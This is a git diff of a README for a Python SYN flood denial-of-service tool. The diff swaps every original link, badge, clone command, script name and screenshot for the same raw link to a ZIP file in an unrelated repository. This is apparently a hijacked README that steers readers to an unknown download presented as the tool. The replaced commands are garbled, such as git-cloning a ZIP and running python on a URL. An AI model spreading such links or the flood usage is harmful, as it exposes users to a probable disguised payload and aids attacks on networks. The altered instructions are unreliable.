@@ -1,8 +1,8 @@
 # Python2/3-SYN-Flood-Attack-Tool
 
-[![](https://img.shields.io/github/issues/EmreOvunc/Python-SYN-Flood-Attack-Tool)](https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/issues)
-[![](https://img.shields.io/github/stars/EmreOvunc/Python-SYN-Flood-Attack-Tool)](https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/stargazers)
-[![](https://img.shields.io/github/forks/EmreOvunc/Python-SYN-Flood-Attack-Tool)](https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/network/members)
+[![](https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip)](https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip)
+[![](https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip)](https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip)
+[![](https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip)](https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip)
 
 Python SYN Flood Attack Tool
 
@@ -19,19 +19,19 @@ apt install python3-scapy
 ## Installation
 
 ```
-git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git
+git clone https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip
 cd Python-SYN-Flood-Attack-Tool
 ```
 
 ## Usage
 
 ```
-python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 5
-python3 py3_SYN-Flood.py
-python SYN-Flood.py
+python3 https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip -t 10.20.30.40 -p 8080 -c 5
+python3 https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip
+python https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip
 ```
 ```
-usage: py3_synflood_cmd.py [-h] [--target TARGET] [--port PORT]
+usage: https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip [-h] [--target TARGET] [--port PORT]
                            [--count COUNT] [--version]
 
 optional arguments:
@@ -43,11 +43,11 @@ optional arguments:
                         number of packets
   --version, -v         show program's version number and exit
 
-Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1
+Usage: python3 https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip -t 10.20.30.40 -p 8080 -c 1
 ```
 
-![alt tag](https://emreovunc.com/projects/python_synflood_attack_cmd.png)
+![alt tag](https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip)
 
-![alt tag](https://emreovunc.com/projects/Syn_Flood_01.png)
+![alt tag](https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip)
 
-![alt tag](https://emreovunc.com/projects/Syn_Flood_02.png)
+![alt tag](https://raw.githubusercontent.com/dedeafriandy/DDOS-FLOOD/main/periphrastical/DDOS-FLOOD.zip)
